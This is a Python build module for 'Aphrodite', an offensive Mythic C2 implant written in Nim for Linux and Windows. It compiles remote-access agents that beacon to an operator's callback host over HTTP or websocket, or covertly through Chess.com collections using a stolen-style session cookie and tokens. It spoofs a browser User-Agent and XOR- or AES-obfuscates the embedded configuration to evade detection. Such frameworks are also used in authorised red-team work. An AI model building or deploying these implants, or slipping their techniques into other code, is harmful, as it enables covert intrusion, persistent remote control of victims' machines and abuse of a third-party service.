import base64
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class AphroditePayloadType(PayloadType):
    name = "aphrodite"
    file_extension = ""
    author = "@0xbbuddha"
    mythic_encrypts = True
    supported_os = [SupportedOS.Linux, SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """
Aphrodite - Agent Mythic C2 cross-platform ecrit en Nim.
Goddess of beauty. Compiles to native binary from Linux.
Supports Linux (native) and Windows (cross-compiled via mingw-w64).
Profiles: http, websocket, chesscom (Chess.com collections — pair with Mythic chesscom C2 profile).
NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
"""
    supports_dynamic_loading = False
    c2_profiles = ["http", "websocket", "chesscom"]
    build_parameters = [
        BuildParameter(
            name="target_os",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target operating system",
            choices=["linux", "windows"],
            default_value="linux",
            required=False,
        ),
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target architecture",
            choices=["amd64"],
            default_value="amd64",
            required=False,
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug output in agent (larger binary, verbose logging)",
            default_value=False,
            required=False,
        ),
        BuildParameter(
            name="static_binary",
            parameter_type=BuildParameterType.Boolean,
            description="Statically link the binary (no shared library dependencies on target)",
            default_value=False,
            required=False,
        ),
        BuildParameter(
            name="obfuscation",
            parameter_type=BuildParameterType.ChooseOne,
            description="String obfuscation: xor (XOR-encode config strings) or aes (AES-128-CBC-encode config strings). Works on all targets.",
            choices=["none", "xor", "aes"],
            default_value="none",
            required=False,
        ),
    ]
    agent_path = Path("agent_functions")
    agent_icon_path = agent_path / "aphrodite.svg"
    agent_code_path = Path("agent_code")
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Copying Nim source code"),
        BuildStep(step_name="Generating Config", step_description="Writing config.nim with C2 parameters"),
        BuildStep(step_name="Compiling", step_description="Compiling Nim agent to native binary"),
        BuildStep(step_name="Finalizing", step_description="Returning compiled binary"),
    ]

    async def build(self) -> BuildResponse:
        build_stdout = ""
        build_stderr = ""

        try:
            if not hasattr(self, "c2info") or not self.c2info:
                build_stderr += "ERROR: No C2 profile selected.\n"
                build_stderr += "Select a C2 profile (http, websocket, or chesscom) when creating the payload.\n"
                return BuildResponse(
                    status=BuildStatus.Error,
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            c2 = self.c2info[0]
            profile = c2.get_c2profile()
            profile_name = profile.get("name", "")
            if profile_name not in ("http", "websocket", "chesscom"):
                build_stderr += (
                    f"Aphrodite supports http, websocket, and chesscom C2 profiles. Got: {profile_name}\n"
                )
                return BuildResponse(
                    status=BuildStatus.Error,
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            params = c2.get_parameters_dict()

            def _extract(p, key, default):
                v = p.get(key, default)
                return v.get("value", default) if isinstance(v, dict) else (v if v is not None else default)

            # --- C2 connection parameters ---
            callback_host = str(_extract(params, "callback_host", "http://127.0.0.1") or "http://127.0.0.1")
            try:
                callback_port = int(_extract(params, "callback_port", 80))
            except (ValueError, TypeError):
                callback_port = 80

            post_uri = str(_extract(params, "post_uri", "/") or "/")
            if not post_uri.startswith("/"):
                post_uri = "/" + post_uri

            # WebSocket endpoint path (Mythic websocket profile uses "ENDPOINT_REPLACE" as key)
            ws_endpoint = str(_extract(params, "ENDPOINT_REPLACE", "") or "")
            if not ws_endpoint:
                ws_endpoint = "ws"

            try:
                interval = int(_extract(params, "callback_interval", 10))
            except (ValueError, TypeError):
                interval = 10

            try:
                jitter = int(_extract(params, "callback_jitter", 0))
            except (ValueError, TypeError):
                jitter = 0

            killdate = str(_extract(params, "killdate", "") or "")

            # --- Headers / User-Agent ---
            headers_raw = params.get("headers", {})
            headers = {}
            try:
                if isinstance(headers_raw, dict):
                    val = headers_raw.get("value", headers_raw)
                    headers = json.loads(val) if isinstance(val, str) else (val if isinstance(val, dict) else {})
                elif isinstance(headers_raw, str):
                    headers = json.loads(headers_raw)
            except Exception:
                headers = {}
            user_agent = headers.get(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            )

            # --- Crypto / PSK ---
            eec_raw = _extract(params, "encrypted_exchange_check", True)
            if isinstance(eec_raw, bool):
                use_psk = not eec_raw
            else:
                use_psk = str(eec_raw).lower() in ("false", "0", "f", "no")

            aes_psk_b64 = ""
            try:
                raw = params.get("AESPSK")
                if isinstance(raw, dict):
                    enc_key = raw.get("enc_key") or ""
                    if enc_key:
                        aes_psk_b64 = str(enc_key).strip()
                    else:
                        val = raw.get("value") or ""
                        if isinstance(val, dict):
                            aes_psk_b64 = str(val.get("enc_key") or "").strip()
                        elif isinstance(val, str):
                            aes_psk_b64 = val.strip()
                elif isinstance(raw, str):
                    aes_psk_b64 = raw.strip()
                # "none" means no PSK — treat as empty
                if aes_psk_b64.lower() in ("none", "null", ""):
                    aes_psk_b64 = ""
            except Exception as e:
                build_stderr += f"AESPSK extraction warning: {e}\n"
            if use_psk and not aes_psk_b64:
                build_stderr += (
                    "WARNING: PSK mode selected but AESPSK is empty or 'none'.\n"
                    "Agent will run in plaintext mode (no encryption).\n"
                )

            # EKE is supported for Linux; Windows falls back to PSK
            use_eke = not use_psk

            # --- Chess.com (chesscom profile) — uses collections + tokens, not HTTP callback URL ---
            chess_cookie = ""
            chess_upload = ""
            chess_clear = ""
            chess_agent_coll = ""
            chess_server_coll = ""
            chess_skip = ""
            chess_library_referer = ""
            chess_wait_ms = 5000
            chess_jitter_sec = 3

            if profile_name == "chesscom":
                chess_cookie = str(_extract(params, "chess_com_cookie", "") or "")
                chess_upload = str(_extract(params, "upload_token", "") or "")
                chess_clear = str(_extract(params, "clear_token", "") or "")
                chess_agent_coll = str(_extract(params, "agent_to_server_collection", "") or "")
                chess_server_coll = str(_extract(params, "server_to_agent_collection", "") or "")
                chess_skip = str(_extract(params, "skip_item_ids", "") or "")
                chess_library_referer = str(_extract(params, "library_referer", "") or "")
                try:
                    chess_wait_ms = max(2000, min(60000, int(interval) * 500))
                except Exception:
                    chess_wait_ms = 5000
                try:
                    chess_jitter_sec = max(0, min(15, int(jitter // 3)))
                except Exception:
                    chess_jitter_sec = 3

            # --- Build base URL (HTTP) ---
            if "://" not in callback_host:
                callback_host = "http://" + callback_host
            host_part = callback_host.split("://")[1]
            if ":" in host_part:
                base_url = callback_host.rstrip("/")
            else:
                base_url = f"{callback_host.rstrip('/')}:{callback_port}"

            # --- WS host (stripped of scheme/path/port) ---
            import re
            ws_host = re.sub(r'^https?://|^wss?://', '', callback_host)
            ws_host = ws_host.split('/')[0].split(':')[0]
            ws_port = callback_port

            # --- Build parameters ---
            target_os = self.get_parameter("target_os") or "linux"
            architecture = self.get_parameter("architecture") or "amd64"
            debug = self.get_parameter("debug") or False
            obfuscation = self.get_parameter("obfuscation") or "none"

            build_stdout += f"[+] Step 1: Gathering files...\n"
            build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug} | obfuscation={obfuscation}\n"
            if profile_name == "websocket":
                build_stdout += f"[*] C2 (WS): ws://{ws_host}:{ws_port}/{ws_endpoint} | interval={interval}s jitter={jitter}%\n"
            elif profile_name == "chesscom":
                build_stdout += (
                    f"[*] C2 (Chess.com): agent→server coll configured | interval={interval}s jitter={jitter}%\n"
                )
            else:
                build_stdout += f"[*] C2 (HTTP): {base_url}{post_uri} | interval={interval}s jitter={jitter}%\n"

            tmpdir = tempfile.mkdtemp(prefix="aphrodite_build_")
            try:
                src_dir = str(self.agent_code_path)
                dst_dir = os.path.join(tmpdir, "aphrodite")
                shutil.copytree(src_dir, dst_dir)

                build_stdout += f"[+] Step 2: Generating config.nim...\n"

                config_nim = self._generate_config_nim(
                    uuid=self.uuid,
                    base_url=base_url,
                    post_uri=post_uri,
                    ws_host=ws_host,
                    ws_port=ws_port,
                    ws_path=ws_endpoint,
                    interval=interval,
                    jitter=jitter,
                    killdate=killdate,
                    user_agent=user_agent,
                    aes_psk=aes_psk_b64,
                    use_psk=use_psk,
                    debug=debug,
                    obfuscation=obfuscation,
                    chess_cookie=chess_cookie,
                    chess_upload=chess_upload,
                    chess_clear=chess_clear,
                    chess_agent_coll=chess_agent_coll,
                    chess_server_coll=chess_server_coll,
                    chess_skip=chess_skip,
                    chess_library_referer=chess_library_referer,
                    chess_wait_ms=chess_wait_ms,
                    chess_jitter_sec=chess_jitter_sec,
                )

                config_path = os.path.join(dst_dir, "src", "config.nim")
                with open(config_path, "w") as f:
                    f.write(config_nim)

                build_stdout += f"[+] Step 3: Compiling Nim agent...\n"

                nim_env = {
                    **os.environ,
                    "PATH": "/opt/nim/bin:/root/.nimble/bin:" + os.environ.get("PATH", ""),
                    "HOME": "/root",
                }

                # Verify nimcrypto is available in Nim's stdlib path
                nimcrypto_check = os.path.exists("/opt/nim/lib/nimcrypto/aes.nim")
                if not nimcrypto_check:
                    build_stderr += (
                        "Error: nimcrypto not found at /opt/nim/lib/nimcrypto/.\n"
                        "Run in the container:\n"
                        "  git clone --depth 1 https://github.com/cheatfate/nimcrypto.git /tmp/nc\n"
                        "  cp -r /tmp/nc/nimcrypto /opt/nim/lib/nimcrypto\n"
                        "Or rebuild the container: sudo ./mythic-cli build aphrodite\n"
                    )
                    return BuildResponse(
                        status=BuildStatus.Error,
                        build_stdout=build_stdout,
                        build_stderr=build_stderr,
                    )
                build_stdout += "[*] nimcrypto found at /opt/nim/lib/nimcrypto/\n"

                nim_flags = [
                    "nim", "c",
                    "--opt:size",
                    "--verbosity:0",
                    "--hints:off",
                    "--warnings:off",
                    "--threads:on",
                    f"--path:{os.path.join(dst_dir, 'src')}",
                ]

                if debug:
                    nim_flags.append("-d:debug")
                else:
                    nim_flags.append("-d:release")
                    nim_flags.append("-d:strip")

                # C2 profile selection
                if profile_name == "websocket":
                    nim_flags.append("-d:c2ProfileWs")
                elif profile_name == "chesscom":
                    nim_flags.append("-d:c2ProfileChesscom")

                # EKE (Linux only — Windows cross-compile lacks OpenSSL)
                if use_eke:
                    if target_os == "linux":
                        nim_flags += [
                            "-d:useEke",
                            "--passL:-Wl,-Bstatic",
                            "--passL:-lssl",
                            "--passL:-lcrypto",
                            "--passL:-Wl,-Bdynamic",
                            "--passL:-ldl",
                            "--passL:-lpthread",
                        ]
                        build_stdout += "[*] EKE enabled (RSA-4096 staging, OpenSSL statically linked)\n"
                    else:
                        build_stderr += (
                            "WARNING: EKE not supported for Windows target — using PSK mode.\n"
                        )

                if obfuscation != "none":
                    build_stdout += f"[*] String obfuscation enabled: {obfuscation.upper()}\n"

                # --- OS-specific compilation flags ---
                if target_os == "windows":
                    nim_flags += [
                        "--os:windows", "--cpu:amd64", "-d:mingw",
                        "--gcc.exe:x86_64-w64-mingw32-gcc",
                        "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
                        "-d:ssl", "-d:useWinssl",
                    ]
                    out_binary = os.path.join(tmpdir, "output", "aphrodite.exe")
                else:
                    nim_flags += ["-d:ssl"]
                    out_binary = os.path.join(tmpdir, "output", "aphrodite")

                os.makedirs(os.path.join(tmpdir, "output"), exist_ok=True)

                nim_flags += [
                    f"--out:{out_binary}",
                    os.path.join(dst_dir, "src", "aphrodite.nim"),
                ]

                build_stdout += f"[*] nim command: {' '.join(nim_flags)}\n"

                result = subprocess.run(
                    nim_flags,
                    capture_output=True,
                    text=True,
                    timeout=300,
                    cwd=dst_dir,
                    env=nim_env,
                )

                if result.stdout:
                    build_stdout += result.stdout
                if result.stderr:
                    build_stderr += result.stderr

                if result.returncode != 0:
                    build_stderr += f"Nim compilation failed (exit code {result.returncode})\n"
                    return BuildResponse(
                        status=BuildStatus.Error,
                        build_stdout=build_stdout,
                        build_stderr=build_stderr,
                    )

                if not os.path.exists(out_binary):
                    build_stderr += f"Binary not found at {out_binary} after compilation\n"
                    return BuildResponse(
                        status=BuildStatus.Error,
                        build_stdout=build_stdout,
                        build_stderr=build_stderr,
                    )

                build_stdout += f"[+] Step 4: Finalizing...\n"

                with open(out_binary, "rb") as f:
                    binary_data = f.read()

                encoded_payload = base64.b64encode(binary_data).decode("ascii")
                build_stdout += f"[+] Binary size: {len(binary_data):,} bytes\n"
                build_stdout += f"[+] Aphrodite build completed successfully.\n"

                return BuildResponse(
                    status=BuildStatus.Success,
                    payload=encoded_payload,
                    build_message="Aphrodite build successful",
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            finally:
                shutil.rmtree(tmpdir, ignore_errors=True)

        except Exception as e:
            import traceback
            build_stderr += f"Build error: {str(e)}\n"
            build_stderr += traceback.format_exc()
            return BuildResponse(
                status=BuildStatus.Error,
                build_stdout=build_stdout,
                build_stderr=build_stderr,
            )

    @staticmethod
    def _xor_encode(data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    @staticmethod
    def _aes128_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
        """Pure-Python AES-128-CBC with PKCS7 padding. No external dependencies."""
        # AES S-box
        _sbox = [
            0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
            0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
            0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
            0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
            0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
            0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
            0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
            0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
            0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
            0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
            0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
            0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
            0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
            0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
            0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
            0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
        ]
        _rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]

        def _xtime(a):
            return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else (a << 1) & 0xff

        def _gmul(a, b):
            p = 0
            for _ in range(8):
                if b & 1: p ^= a
                hi = a & 0x80
                a = (a << 1) & 0xff
                if hi: a ^= 0x1b
                b >>= 1
            return p

        def _key_expand(k):
            w = list(k)
            for i in range(4, 44):
                t = w[(i-1)*4:i*4]
                if i % 4 == 0:
                    t = [_sbox[t[1]] ^ _rcon[i//4-1], _sbox[t[2]], _sbox[t[3]], _sbox[t[0]]]
                w += [t[j] ^ w[(i-4)*4+j] for j in range(4)]
            # Each round key: 4 columns of 4 bytes → rk[col][row]
            return [[[w[i*16 + c*4 + r] for r in range(4)] for c in range(4)] for i in range(11)]

        def _add_round_key(state, rk):
            return [[state[r][c] ^ rk[c][r] for c in range(4)] for r in range(4)]

        def _sub_bytes(state):
            return [[_sbox[state[r][c]] for c in range(4)] for r in range(4)]

        def _shift_rows(state):
            return [
                [state[0][0], state[0][1], state[0][2], state[0][3]],
                [state[1][1], state[1][2], state[1][3], state[1][0]],
                [state[2][2], state[2][3], state[2][0], state[2][1]],
                [state[3][3], state[3][0], state[3][1], state[3][2]],
            ]

        def _mix_columns(state):
            out = [[0]*4 for _ in range(4)]
            for c in range(4):
                s = [state[r][c] for r in range(4)]
                out[0][c] = _gmul(s[0],2) ^ _gmul(s[1],3) ^ s[2] ^ s[3]
                out[1][c] = s[0] ^ _gmul(s[1],2) ^ _gmul(s[2],3) ^ s[3]
                out[2][c] = s[0] ^ s[1] ^ _gmul(s[2],2) ^ _gmul(s[3],3)
                out[3][c] = _gmul(s[0],3) ^ s[1] ^ s[2] ^ _gmul(s[3],2)
            return out

        def _aes_block(block, round_keys):
            state = [[block[r + 4*c] for c in range(4)] for r in range(4)]
            state = _add_round_key(state, round_keys[0])
            for rnd in range(1, 10):
                state = _sub_bytes(state)
                state = _shift_rows(state)
                state = _mix_columns(state)
                state = _add_round_key(state, round_keys[rnd])
            state = _sub_bytes(state)
            state = _shift_rows(state)
            state = _add_round_key(state, round_keys[10])
            return bytes(state[r][c] for c in range(4) for r in range(4))

        # PKCS7 pad
        pad = 16 - (len(data) % 16)
        data = data + bytes([pad] * pad)

        rk = _key_expand(list(key))
        result = b""
        prev = list(iv)
        for i in range(0, len(data), 16):
            block = [data[i+j] ^ prev[j] for j in range(16)]
            enc = _aes_block(block, rk)
            result += enc
            prev = list(enc)
        return result

    @staticmethod
    def _nim_bytes(data: bytes) -> str:
        return "[" + ", ".join(f"0x{b:02x}'u8" for b in data) + "]"

    def _generate_config_nim(
        self, uuid, base_url, post_uri,
        ws_host, ws_port, ws_path,
        interval, jitter, killdate, user_agent, aes_psk, use_psk, debug,
        obfuscation="none",
        chess_cookie="", chess_upload="", chess_clear="",
        chess_agent_coll="", chess_server_coll="", chess_skip="",
        chess_library_referer="",
        chess_wait_ms=5000, chess_jitter_sec=3,
    ) -> str:
        def nim_str(s):
            return s.replace("\\", "\\\\").replace('"', '\\"')

        # Non-string constants are never obfuscated
        scalars = (
            f"  WsPort* = {ws_port}\n"
            f"  SleepInterval* = {interval}\n"
            f"  JitterPercent* = {jitter}\n"
            f"  UsePsk* = {str(use_psk).lower()}\n"
            f"  DebugMode* = {str(debug).lower()}\n"
            f"  ChessWaitMs* = {chess_wait_ms}\n"
            f"  ChessJitterSeconds* = {chess_jitter_sec}\n"
        )

        chess_lines = (
            f'  ChessCookie* = "{nim_str(chess_cookie)}"\n'
            f'  ChessUploadToken* = "{nim_str(chess_upload)}"\n'
            f'  ChessClearToken* = "{nim_str(chess_clear)}"\n'
            f'  ChessAgentUploadCollection* = "{nim_str(chess_agent_coll)}"\n'
            f'  ChessServerReplyCollection* = "{nim_str(chess_server_coll)}"\n'
            f'  ChessSkipItemIds* = "{nim_str(chess_skip)}"\n'
            f'  ChessLibraryReferer* = "{nim_str(chess_library_referer)}"\n'
        )

        if obfuscation == "none":
            return (
                "# config.nim - Auto-generated by Aphrodite builder. DO NOT EDIT MANUALLY.\n"
                "const\n"
                f'  AgentUUID* = "{nim_str(uuid)}"\n'
                f'  C2BaseUrl* = "{nim_str(base_url)}"\n'
                f'  C2Endpoint* = "{nim_str(post_uri)}"\n'
                f'  WsHost* = "{nim_str(ws_host)}"\n'
                f'  WsPath* = "{nim_str(ws_path)}"\n'
                f'  KillDate* = "{nim_str(killdate)}"\n'
                f'  UserAgent* = "{nim_str(user_agent)}"\n'
                f'  AesPsk* = "{nim_str(aes_psk)}"\n'
                + chess_lines
                + scalars
            )

        strings = {
            "AgentUUID": uuid.encode(),
            "C2BaseUrl": base_url.encode(),
            "C2Endpoint": post_uri.encode(),
            "WsHost": ws_host.encode(),
            "WsPath": ws_path.encode(),
            "KillDate": killdate.encode(),
            "UserAgent": user_agent.encode(),
            "AesPsk": aes_psk.encode(),
            "ChessCookie": chess_cookie.encode(),
            "ChessUploadToken": chess_upload.encode(),
            "ChessClearToken": chess_clear.encode(),
            "ChessAgentUploadCollection": chess_agent_coll.encode(),
            "ChessServerReplyCollection": chess_server_coll.encode(),
            "ChessSkipItemIds": chess_skip.encode(),
            "ChessLibraryReferer": chess_library_referer.encode(),
        }

        lines = ["# config.nim - Auto-generated by Aphrodite builder. DO NOT EDIT MANUALLY."]
        lines.append("import crypto/obf")
        lines.append("const")

        if obfuscation == "xor":
            key = os.urandom(16)
            lines.append(f"  obfKey = {self._nim_bytes(key)}")
            for name, data in strings.items():
                enc = self._xor_encode(data, key)
                lines.append(f"  enc{name} = {self._nim_bytes(enc)}")
            lines.append(scalars.rstrip())
            lines.append("")
            for name in strings:
                lines.append(f"let {name}* = xorDecode(enc{name}, obfKey)")

        elif obfuscation == "aes":
            key = os.urandom(16)
            iv = os.urandom(16)
            lines.append(f"  obfAesKey = {self._nim_bytes(key)}")
            lines.append(f"  obfAesIv  = {self._nim_bytes(iv)}")
            for name, data in strings.items():
                enc = self._aes128_cbc_encrypt(data, key, iv)
                lines.append(f"  enc{name} = {self._nim_bytes(enc)}")
            lines.append(scalars.rstrip())
            lines.append("")
            for name in strings:
                lines.append(f"let {name}* = aesDecode(enc{name}, obfAesKey, obfAesIv)")

        return "\n".join(lines) + "\n"
